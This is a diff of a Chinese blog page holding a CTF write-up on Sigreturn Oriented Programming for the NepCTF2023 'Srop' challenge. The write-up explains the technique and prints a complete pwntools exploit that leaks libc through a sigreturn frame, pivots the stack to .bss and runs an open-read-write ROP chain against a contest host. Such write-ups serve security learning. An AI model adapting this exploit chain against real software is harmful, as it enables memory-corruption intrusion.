@@ -230,9 +230,9 @@
           
           
           <li>
-            <a href="/categories/">
+            <a href="/about/">
               
-              分类
+              关于
               
               
             </a>
@@ -241,9 +241,9 @@
           
           
           <li>
-            <a href="/about/">
+            <a href="/categories/">
               
-              关于
+              分类
               
               
             </a>
@@ -372,7 +372,7 @@
             </span>
             <div class="blank_box"></div>
             <span class="meta">
-              Words <span class="post-count">767</span> In Total
+              Words <span class="post-count">769</span> In Total
             </span>
             <div class="blank_box"></div>
             <!-- WordCount end -->
@@ -420,159 +420,160 @@
       <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
         
 
-        <h1 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h1><h2 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h2><p><code>SROP</code>，即 Sigreturn Oriented Programming，正是利用了 <code>Sigreturn</code> 机制的弱点，来进行攻击。</p>
-<p>在执行 <code>sigreturn</code> 系统调用的时候，不会对 signal 做检查</p>
-<p><img src="/cn/Sagiring_markdown/SROP/spaces%2F-MGvsJHYreZx4FTJt1gV%2Fuploads%2Fgit-blob-127b55183cffd2ac45354931d57e715c335f1348%2F6.1.4_sigret.jpg" alt></p>
+        <h1 id="srop">SROP</h1>
+<h2 id="简单介绍">简单介绍</h2>
+<p><code>SROP</code>，即 Sigreturn Oriented Programming，正是利用了
+<code>Sigreturn</code> 机制的弱点，来进行攻击。</p>
+<p>在执行 <code>sigreturn</code> 系统调用的时候，不会对 signal
+做检查</p>
+<p><img src="/cn/Sagiring_markdown/SROP/spaces%2F-MGvsJHYreZx4FTJt1gV%2Fuploads%2Fgit-blob-127b55183cffd2ac45354931d57e715c335f1348%2F6.1.4_sigret.jpg"></p>
 <p>简单来说就是通过<code>sigreturn</code>的系统调用<code>0xf</code>的<code>syscall</code>，将所有寄存器恢复成预先设置好的样子。通过栈溢出设定，从而达成控制程序的目的。出内核态时候而<code>sigreturn</code>本身是用来恢复上下文的</p>
-<h2 id="NepCTF2023-Srop"><a href="#NepCTF2023-Srop" class="headerlink" title="NepCTF2023 Srop"></a>NepCTF2023 Srop</h2><p>先<code>checksec</code></p>
-<p><img src="/cn/Sagiring_markdown/SROP/image-20230813115015089.png" alt></p>
-<p><code>RELRO</code>全开 <code>got</code>表不能改；<code>NX</code>开，栈不可执行</p>
+<h2 id="nepctf2023-srop">NepCTF2023 Srop</h2>
+<p>先<code>checksec</code></p>
+<p><img src="/cn/Sagiring_markdown/SROP/image-20230813115015089.png"></p>
+<p><code>RELRO</code>全开
+<code>got</code>表不能改；<code>NX</code>开，栈不可执行</p>
 <p>题目给了<code>ld</code>和<code>libc</code>,设置一下</p>
-<pre><code class="lang-bash">patchelf --set-interpreter ld路径 ./pwn
-</code></pre>
-<pre><code class="lang-bash">patchelf --replace-needed libc.so.6 libc路径 ./pwn
-</code></pre>
-<pre><code class="lang-bash">ldd ./pwn
-</code></pre>
+<div class="sourceCode" id="cb1"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">patchelf</span> <span class="at">--set-interpreter</span> ld路径 ./pwn</span></code></pre></div>
+<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">patchelf</span> <span class="at">--replace-needed</span> libc.so.6 libc路径 ./pwn</span></code></pre></div>
+<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="fu">ldd</span> ./pwn </span></code></pre></div>
 <p>题目本身给的代码很简单</p>
-<p><img src="/cn/Sagiring_markdown/SROP/image-20230813115614859.png" alt></p>
-<p><img src="/cn/Sagiring_markdown/SROP/image-20230813115530879.png" alt></p>
+<p><img src="/cn/Sagiring_markdown/SROP/image-20230813115614859.png"></p>
+<p><img src="/cn/Sagiring_markdown/SROP/image-20230813115530879.png"></p>
 <p>一个简单的系统调用<code>read</code>栈溢出</p>
 <p>此处贴出常用系统调用</p>
-<div class="table-container">
 <table>
 <thead>
-<tr>
+<tr class="header">
 <th>函数</th>
 <th>调用号</th>
 </tr>
 </thead>
 <tbody>
-<tr>
+<tr class="odd">
 <td><code>read</code></td>
 <td>0</td>
 </tr>
-<tr>
+<tr class="even">
 <td><code>write</code></td>
 <td>1</td>
 </tr>
-<tr>
+<tr class="odd">
 <td><code>open</code></td>
 <td>2</td>
 </tr>
-<tr>
+<tr class="even">
 <td><code>rt_sigreturn</code></td>
 <td>0xf</td>
 </tr>
-<tr>
+<tr class="odd">
 <td><code>execve</code></td>
 <td>59</td>
 </tr>
 </tbody>
 </table>
-</div>
 <p>同时注意到开了沙箱</p>
-<p><img src="/cn/Sagiring_markdown/SROP/image-20230813120434408.png" alt></p>
-<p>目标就明确了 使用<code>srop</code>通过<code>orw</code>进行<code>flag</code>的读取</p>
-<p><img src="/cn/Sagiring_markdown/SROP/image-20230813120633751.png" alt></p>
+<p><img src="/cn/Sagiring_markdown/SROP/image-20230813120434408.png"></p>
+<p>目标就明确了
+使用<code>srop</code>通过<code>orw</code>进行<code>flag</code>的读取</p>
+<p><img src="/cn/Sagiring_markdown/SROP/image-20230813120633751.png"></p>
 <p>看一下<code>syscall</code>对准一下寄存器</p>
 <p>贴出<code>exp</code></p>
-<pre><code class="lang-python">from pwn import * 
-from pwn import p64,u64
-
-
-debug = 1
-gdb_is = 1
-# context(arch=&#39;i386&#39;,os = &#39;linux&#39;, log_level=&#39;DEBUG&#39;)
-context(arch=&#39;amd64&#39;,os = &#39;linux&#39;)
-if debug:
-    context.terminal = [&#39;/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe&#39;,&#39;nt&#39;,&#39;Ubuntu&#39;,&#39;-c&#39;]
-    r = process(&quot;./pwn&quot;)
-
-else:
-    host = &quot;nepctf.1cepeak.cn&quot;
-    r = connect(host,32552)#远程连接
-    gdb_is =0
-
-if gdb_is:
-    # gdb.attach(r,&#39;b* 0x00401571&#39;)
-    gdb.attach(r)
-    pause()
-    pass
-
-
-
-elf = ELF(&#39;./pwn&#39;)
-libc = ELF(&#39;./libc-2.27.so&#39;)
-pop_rdi = 0x000400813
-pop_rsi_r15 = 0x000400811
-
-bss_addr = 0x601050
-base_addr = bss_addr + 0x8
-syscall_addr = elf.sym[&#39;syscall&#39;]
-payload= b&#39;A&#39;* 48 + b&#39;junkjunk&#39; 
-syscall_got = elf.got[&#39;syscall&#39;]
-
-#使用pwntools的SigreturnFrame()帮助构造结构体
-frame_write = SigreturnFrame()
-frame_write.rdi = 1
-frame_write.rsi = 1
-frame_write.rdx = syscall_got #泄露libc地址
-frame_write.rcx = 0x8
-frame_write.rip = syscall_addr 
-frame_write.rsp = base_addr + 0xF0 + 0x8 * 4 #一个SigreturnFrame()大小0xF0 控制栈顶
-
-frame_read_data = SigreturnFrame()
-frame_read_data.rdi = 0 #由于syscall之前对寄存器做了移位，所以不是rax
-frame_read_data.rsi = 0
-frame_read_data.rdx = bss_addr
-frame_read_data.rcx = 0x228
-frame_read_data.rsp = base_addr #由于不知道栈的地址，将其迁移到bss段进行控制
-frame_read_data.rip = syscall_addr #直接调用syscall运行设置的函数
-
-
-payload +=  p64(pop_rdi)+ p64(0xf) +p64(syscall_addr) + bytes(frame_read_data) 
-r.send(payload)
-time.sleep(1)
-
-#----------------------------------------
-
-frame_read_data = SigreturnFrame()
-frame_read_data.rdi = 0 
-frame_read_data.rsi = 0
-frame_read_data.rdx = bss_addr
-frame_read_data.rcx = 0x8 * 30
-frame_read_data.rsp = base_addr  - 0x8
-frame_read_data.rip = syscall_addr
-
-payload_read = p64(pop_rdi)+ p64(0xf) +p64(syscall_addr) + bytes(frame_read_data) 
-
-payload = p64(0) + p64(pop_rdi)+ p64(0xf) +p64(syscall_addr) + bytes(frame_write) + payload_read
-r.send(payload)
-#泄露libc地址
-#----------------------------------------
-libc_syscall_addr = u64(r.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))
-libc.address =  libc_syscall_addr - libc.sym[&#39;syscall&#39;]
-info(f&#39;libc_syscall_addr = &#123;hex(libc_syscall_addr)&#125;&#39;)
-info(f&#39;system = &#123;hex(libc.sym[&quot;system&quot;])&#125;&#39;)
-
-pop_rsi = 0x00023a6a + libc.address
-pop_rdx = 0x000001b96 + libc.address
-syscall_addr = 0x0011B537 + libc.address #此处将syscall的移位去掉了
-pop_rax = 0x001b500  + libc.address
-
-time.sleep(1)
-#ORW
-payload = p64(pop_rdi) + p64(bss_addr + 0x8 * 25) + p64(pop_rsi) + p64(0)+ p64(pop_rax) + p64(2) + p64(syscall_addr)
-#0x00601009找的data段的地址
-payload += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(0x00601009) + p64(pop_rdx) + p64(0x40)  + p64(pop_rax) + p64(0) + p64(syscall_addr)
-
-payload += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(0x00601009) + p64(pop_rdx) + p64(0x40) + p64(pop_rax) + p64(1) + p64(syscall_addr)
-payload += b&#39;flag&#39;.ljust(8, b&#39;\x00&#39;) 
-#bss_addr + 0x8 * 25 是flag的位置
-r.send(payload)
-r.interactive()
-</code></pre>
+<div class="sourceCode" id="cb4"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span> </span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> p64,u64</span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>debug <span class="op">=</span> <span class="dv">1</span></span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a>gdb_is <span class="op">=</span> <span class="dv">1</span></span>
+<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a><span class="co"># context(arch=&#39;i386&#39;,os = &#39;linux&#39;, log_level=&#39;DEBUG&#39;)</span></span>
+<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a>context(arch<span class="op">=</span><span class="st">&#39;amd64&#39;</span>,os <span class="op">=</span> <span class="st">&#39;linux&#39;</span>)</span>
+<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> debug:</span>
+<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a>    context.terminal <span class="op">=</span> [<span class="st">&#39;/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe&#39;</span>,<span class="st">&#39;nt&#39;</span>,<span class="st">&#39;Ubuntu&#39;</span>,<span class="st">&#39;-c&#39;</span>]</span>
+<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a>    r <span class="op">=</span> process(<span class="st">&quot;./pwn&quot;</span>)</span>
+<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a><span class="cf">else</span>:</span>
+<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a>    host <span class="op">=</span> <span class="st">&quot;nepctf.1cepeak.cn&quot;</span></span>
+<span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a>    r <span class="op">=</span> <span class="ex">connect</span>(host,<span class="dv">32552</span>)<span class="co">#远程连接</span></span>
+<span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a>    gdb_is <span class="op">=</span><span class="dv">0</span></span>
+<span id="cb4-17"><a href="#cb4-17" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-18"><a href="#cb4-18" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> gdb_is:</span>
+<span id="cb4-19"><a href="#cb4-19" aria-hidden="true" tabindex="-1"></a>    <span class="co"># gdb.attach(r,&#39;b* 0x00401571&#39;)</span></span>
+<span id="cb4-20"><a href="#cb4-20" aria-hidden="true" tabindex="-1"></a>    gdb.attach(r)</span>
+<span id="cb4-21"><a href="#cb4-21" aria-hidden="true" tabindex="-1"></a>    pause()</span>
+<span id="cb4-22"><a href="#cb4-22" aria-hidden="true" tabindex="-1"></a>    <span class="cf">pass</span></span>
+<span id="cb4-23"><a href="#cb4-23" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-24"><a href="#cb4-24" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-25"><a href="#cb4-25" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-26"><a href="#cb4-26" aria-hidden="true" tabindex="-1"></a>elf <span class="op">=</span> ELF(<span class="st">&#39;./pwn&#39;</span>)</span>
+<span id="cb4-27"><a href="#cb4-27" aria-hidden="true" tabindex="-1"></a>libc <span class="op">=</span> ELF(<span class="st">&#39;./libc-2.27.so&#39;</span>)</span>
+<span id="cb4-28"><a href="#cb4-28" aria-hidden="true" tabindex="-1"></a>pop_rdi <span class="op">=</span> <span class="bn">0x000400813</span></span>
+<span id="cb4-29"><a href="#cb4-29" aria-hidden="true" tabindex="-1"></a>pop_rsi_r15 <span class="op">=</span> <span class="bn">0x000400811</span></span>
+<span id="cb4-30"><a href="#cb4-30" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-31"><a href="#cb4-31" aria-hidden="true" tabindex="-1"></a>bss_addr <span class="op">=</span> <span class="bn">0x601050</span></span>
+<span id="cb4-32"><a href="#cb4-32" aria-hidden="true" tabindex="-1"></a>base_addr <span class="op">=</span> bss_addr <span class="op">+</span> <span class="bn">0x8</span></span>
+<span id="cb4-33"><a href="#cb4-33" aria-hidden="true" tabindex="-1"></a>syscall_addr <span class="op">=</span> elf.sym[<span class="st">&#39;syscall&#39;</span>]</span>
+<span id="cb4-34"><a href="#cb4-34" aria-hidden="true" tabindex="-1"></a>payload<span class="op">=</span> <span class="st">b&#39;A&#39;</span><span class="op">*</span> <span class="dv">48</span> <span class="op">+</span> <span class="st">b&#39;junkjunk&#39;</span> </span>
+<span id="cb4-35"><a href="#cb4-35" aria-hidden="true" tabindex="-1"></a>syscall_got <span class="op">=</span> elf.got[<span class="st">&#39;syscall&#39;</span>]</span>
+<span id="cb4-36"><a href="#cb4-36" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-37"><a href="#cb4-37" aria-hidden="true" tabindex="-1"></a><span class="co">#使用pwntools的SigreturnFrame()帮助构造结构体</span></span>
+<span id="cb4-38"><a href="#cb4-38" aria-hidden="true" tabindex="-1"></a>frame_write <span class="op">=</span> SigreturnFrame()</span>
+<span id="cb4-39"><a href="#cb4-39" aria-hidden="true" tabindex="-1"></a>frame_write.rdi <span class="op">=</span> <span class="dv">1</span></span>
+<span id="cb4-40"><a href="#cb4-40" aria-hidden="true" tabindex="-1"></a>frame_write.rsi <span class="op">=</span> <span class="dv">1</span></span>
+<span id="cb4-41"><a href="#cb4-41" aria-hidden="true" tabindex="-1"></a>frame_write.rdx <span class="op">=</span> syscall_got <span class="co">#泄露libc地址</span></span>
+<span id="cb4-42"><a href="#cb4-42" aria-hidden="true" tabindex="-1"></a>frame_write.rcx <span class="op">=</span> <span class="bn">0x8</span></span>
+<span id="cb4-43"><a href="#cb4-43" aria-hidden="true" tabindex="-1"></a>frame_write.rip <span class="op">=</span> syscall_addr </span>
+<span id="cb4-44"><a href="#cb4-44" aria-hidden="true" tabindex="-1"></a>frame_write.rsp <span class="op">=</span> base_addr <span class="op">+</span> <span class="bn">0xF0</span> <span class="op">+</span> <span class="bn">0x8</span> <span class="op">*</span> <span class="dv">4</span> <span class="co">#一个SigreturnFrame()大小0xF0 控制栈顶</span></span>
+<span id="cb4-45"><a href="#cb4-45" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-46"><a href="#cb4-46" aria-hidden="true" tabindex="-1"></a>frame_read_data <span class="op">=</span> SigreturnFrame()</span>
+<span id="cb4-47"><a href="#cb4-47" aria-hidden="true" tabindex="-1"></a>frame_read_data.rdi <span class="op">=</span> <span class="dv">0</span> <span class="co">#由于syscall之前对寄存器做了移位，所以不是rax</span></span>
+<span id="cb4-48"><a href="#cb4-48" aria-hidden="true" tabindex="-1"></a>frame_read_data.rsi <span class="op">=</span> <span class="dv">0</span></span>
+<span id="cb4-49"><a href="#cb4-49" aria-hidden="true" tabindex="-1"></a>frame_read_data.rdx <span class="op">=</span> bss_addr</span>
+<span id="cb4-50"><a href="#cb4-50" aria-hidden="true" tabindex="-1"></a>frame_read_data.rcx <span class="op">=</span> <span class="bn">0x228</span></span>
+<span id="cb4-51"><a href="#cb4-51" aria-hidden="true" tabindex="-1"></a>frame_read_data.rsp <span class="op">=</span> base_addr <span class="co">#由于不知道栈的地址，将其迁移到bss段进行控制</span></span>
+<span id="cb4-52"><a href="#cb4-52" aria-hidden="true" tabindex="-1"></a>frame_read_data.rip <span class="op">=</span> syscall_addr <span class="co">#直接调用syscall运行设置的函数</span></span>
+<span id="cb4-53"><a href="#cb4-53" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-54"><a href="#cb4-54" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-55"><a href="#cb4-55" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span>  p64(pop_rdi)<span class="op">+</span> p64(<span class="bn">0xf</span>) <span class="op">+</span>p64(syscall_addr) <span class="op">+</span> <span class="bu">bytes</span>(frame_read_data) </span>
+<span id="cb4-56"><a href="#cb4-56" aria-hidden="true" tabindex="-1"></a>r.send(payload)</span>
+<span id="cb4-57"><a href="#cb4-57" aria-hidden="true" tabindex="-1"></a>time.sleep(<span class="dv">1</span>)</span>
+<span id="cb4-58"><a href="#cb4-58" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-59"><a href="#cb4-59" aria-hidden="true" tabindex="-1"></a><span class="co">#----------------------------------------</span></span>
+<span id="cb4-60"><a href="#cb4-60" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-61"><a href="#cb4-61" aria-hidden="true" tabindex="-1"></a>frame_read_data <span class="op">=</span> SigreturnFrame()</span>
+<span id="cb4-62"><a href="#cb4-62" aria-hidden="true" tabindex="-1"></a>frame_read_data.rdi <span class="op">=</span> <span class="dv">0</span> </span>
+<span id="cb4-63"><a href="#cb4-63" aria-hidden="true" tabindex="-1"></a>frame_read_data.rsi <span class="op">=</span> <span class="dv">0</span></span>
+<span id="cb4-64"><a href="#cb4-64" aria-hidden="true" tabindex="-1"></a>frame_read_data.rdx <span class="op">=</span> bss_addr</span>
+<span id="cb4-65"><a href="#cb4-65" aria-hidden="true" tabindex="-1"></a>frame_read_data.rcx <span class="op">=</span> <span class="bn">0x8</span> <span class="op">*</span> <span class="dv">30</span></span>
+<span id="cb4-66"><a href="#cb4-66" aria-hidden="true" tabindex="-1"></a>frame_read_data.rsp <span class="op">=</span> base_addr  <span class="op">-</span> <span class="bn">0x8</span></span>
+<span id="cb4-67"><a href="#cb4-67" aria-hidden="true" tabindex="-1"></a>frame_read_data.rip <span class="op">=</span> syscall_addr</span>
+<span id="cb4-68"><a href="#cb4-68" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-69"><a href="#cb4-69" aria-hidden="true" tabindex="-1"></a>payload_read <span class="op">=</span> p64(pop_rdi)<span class="op">+</span> p64(<span class="bn">0xf</span>) <span class="op">+</span>p64(syscall_addr) <span class="op">+</span> <span class="bu">bytes</span>(frame_read_data) </span>
+<span id="cb4-70"><a href="#cb4-70" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-71"><a href="#cb4-71" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> p64(<span class="dv">0</span>) <span class="op">+</span> p64(pop_rdi)<span class="op">+</span> p64(<span class="bn">0xf</span>) <span class="op">+</span>p64(syscall_addr) <span class="op">+</span> <span class="bu">bytes</span>(frame_write) <span class="op">+</span> payload_read</span>
+<span id="cb4-72"><a href="#cb4-72" aria-hidden="true" tabindex="-1"></a>r.send(payload)</span>
+<span id="cb4-73"><a href="#cb4-73" aria-hidden="true" tabindex="-1"></a><span class="co">#泄露libc地址</span></span>
+<span id="cb4-74"><a href="#cb4-74" aria-hidden="true" tabindex="-1"></a><span class="co">#----------------------------------------</span></span>
+<span id="cb4-75"><a href="#cb4-75" aria-hidden="true" tabindex="-1"></a>libc_syscall_addr <span class="op">=</span> u64(r.recvuntil(<span class="st">b&#39;</span><span class="ch">\x7f</span><span class="st">&#39;</span>)[<span class="op">-</span><span class="dv">6</span>:].ljust(<span class="dv">8</span>,<span class="st">b&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>))</span>
+<span id="cb4-76"><a href="#cb4-76" aria-hidden="true" tabindex="-1"></a>libc.address <span class="op">=</span>  libc_syscall_addr <span class="op">-</span> libc.sym[<span class="st">&#39;syscall&#39;</span>]</span>
+<span id="cb4-77"><a href="#cb4-77" aria-hidden="true" tabindex="-1"></a>info(<span class="ss">f&#39;libc_syscall_addr = </span><span class="sc">&#123;</span><span class="bu">hex</span>(libc_syscall_addr)<span class="sc">&#125;</span><span class="ss">&#39;</span>)</span>
+<span id="cb4-78"><a href="#cb4-78" aria-hidden="true" tabindex="-1"></a>info(<span class="ss">f&#39;system = </span><span class="sc">&#123;</span><span class="bu">hex</span>(libc.sym[<span class="st">&quot;system&quot;</span>])<span class="sc">&#125;</span><span class="ss">&#39;</span>)</span>
+<span id="cb4-79"><a href="#cb4-79" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-80"><a href="#cb4-80" aria-hidden="true" tabindex="-1"></a>pop_rsi <span class="op">=</span> <span class="bn">0x00023a6a</span> <span class="op">+</span> libc.address</span>
+<span id="cb4-81"><a href="#cb4-81" aria-hidden="true" tabindex="-1"></a>pop_rdx <span class="op">=</span> <span class="bn">0x000001b96</span> <span class="op">+</span> libc.address</span>
+<span id="cb4-82"><a href="#cb4-82" aria-hidden="true" tabindex="-1"></a>syscall_addr <span class="op">=</span> <span class="bn">0x0011B537</span> <span class="op">+</span> libc.address <span class="co">#此处将syscall的移位去掉了</span></span>
+<span id="cb4-83"><a href="#cb4-83" aria-hidden="true" tabindex="-1"></a>pop_rax <span class="op">=</span> <span class="bn">0x001b500</span>  <span class="op">+</span> libc.address</span>
+<span id="cb4-84"><a href="#cb4-84" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-85"><a href="#cb4-85" aria-hidden="true" tabindex="-1"></a>time.sleep(<span class="dv">1</span>)</span>
+<span id="cb4-86"><a href="#cb4-86" aria-hidden="true" tabindex="-1"></a><span class="co">#ORW</span></span>
+<span id="cb4-87"><a href="#cb4-87" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> p64(pop_rdi) <span class="op">+</span> p64(bss_addr <span class="op">+</span> <span class="bn">0x8</span> <span class="op">*</span> <span class="dv">25</span>) <span class="op">+</span> p64(pop_rsi) <span class="op">+</span> p64(<span class="dv">0</span>)<span class="op">+</span> p64(pop_rax) <span class="op">+</span> p64(<span class="dv">2</span>) <span class="op">+</span> p64(syscall_addr)</span>
+<span id="cb4-88"><a href="#cb4-88" aria-hidden="true" tabindex="-1"></a><span class="co">#0x00601009找的data段的地址</span></span>
+<span id="cb4-89"><a href="#cb4-89" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p64(pop_rdi) <span class="op">+</span> p64(<span class="dv">3</span>) <span class="op">+</span> p64(pop_rsi) <span class="op">+</span> p64(<span class="bn">0x00601009</span>) <span class="op">+</span> p64(pop_rdx) <span class="op">+</span> p64(<span class="bn">0x40</span>)  <span class="op">+</span> p64(pop_rax) <span class="op">+</span> p64(<span class="dv">0</span>) <span class="op">+</span> p64(syscall_addr)</span>
+<span id="cb4-90"><a href="#cb4-90" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb4-91"><a href="#cb4-91" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p64(pop_rdi) <span class="op">+</span> p64(<span class="dv">1</span>) <span class="op">+</span> p64(pop_rsi) <span class="op">+</span> p64(<span class="bn">0x00601009</span>) <span class="op">+</span> p64(pop_rdx) <span class="op">+</span> p64(<span class="bn">0x40</span>) <span class="op">+</span> p64(pop_rax) <span class="op">+</span> p64(<span class="dv">1</span>) <span class="op">+</span> p64(syscall_addr)</span>
+<span id="cb4-92"><a href="#cb4-92" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">b&#39;flag&#39;</span>.ljust(<span class="dv">8</span>, <span class="st">b&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>) </span>
+<span id="cb4-93"><a href="#cb4-93" aria-hidden="true" tabindex="-1"></a><span class="co">#bss_addr + 0x8 * 25 是flag的位置</span></span>
+<span id="cb4-94"><a href="#cb4-94" aria-hidden="true" tabindex="-1"></a>r.send(payload)</span>
+<span id="cb4-95"><a href="#cb4-95" aria-hidden="true" tabindex="-1"></a>r.interactive()</span></code></pre></div>
 <p><code>srop</code>控制后泄露<code>libc</code>地址，再使用<code>orw</code>打印出<code>flag</code>。</p>
 <p>泄露<code>libc</code>目的：</p>
 <p>泄露<code>libc</code>后可利用的<code>rop gadget</code>更多了，方便<code>orw</code></p>
@@ -725,7 +726,7 @@ r.interactive()
         <div id="toc" class="toc-article">
         <strong class="toc-title">目录</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#SROP"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">SROP</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">简单介绍</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#NepCTF2023-Srop"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">NepCTF2023 Srop</span></a></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#srop"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">SROP</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">简单介绍</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#nepctf2023-srop"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">NepCTF2023 Srop</span></a></li></ol></li></ol>
         
         </div>
       </aside>
@@ -1249,6 +1250,21 @@ start: '#bbbbee', end: '#0085a1' } }; $('#tag_cloud a').tagcloud(); }) } </scrip
 		<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
 
 		
-	</body>
+	<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
 </html>
 
